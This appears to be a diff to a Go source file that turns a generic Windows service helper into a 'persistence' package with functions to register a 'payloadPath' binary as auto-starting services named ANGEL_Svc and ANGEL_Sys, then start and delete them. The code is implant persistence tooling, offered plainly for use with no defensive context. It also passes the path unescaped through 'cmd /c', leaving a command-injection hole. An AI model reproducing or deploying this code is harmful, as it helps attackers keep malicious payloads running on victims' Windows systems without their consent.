@@ -1,26 +1,43 @@
-package windows
+//go:build windows
+
+package persistence
 
 import (
 "os/exec"
 )
 
-type ServicePersistence struct{}
-
-func NewServicePersistence() *ServicePersistence {
-return &ServicePersistence{}
+func ServicePersist(payloadPath string) bool {
+cmd := exec.Command("cmd", "/c", "sc create ANGEL_Svc binPath= \""+payloadPath+"\" start= auto")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
 
-func (s *ServicePersistence) CreateService(name, path string) error {
-cmd := exec.Command("sc", "create", name, "binPath="+path, "start=auto")
-return cmd.Run()
+func ServicePersistSystem(payloadPath string) bool {
+cmd := exec.Command("cmd", "/c", "sc create ANGEL_Sys binPath= \""+payloadPath+"\" start= auto")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
 
-func (s *ServicePersistence) StartService(name string) error {
-cmd := exec.Command("sc", "start", name)
-return cmd.Run()
+func ServiceStart() bool {
+cmd := exec.Command("cmd", "/c", "sc start ANGEL_Svc")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
 
-func (s *ServicePersistence) DeleteService(name string) error {
-cmd := exec.Command("sc", "delete", name)
-return cmd.Run()
+func ServiceDelete() bool {
+cmd := exec.Command("cmd", "/c", "sc delete ANGEL_Svc")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
 }
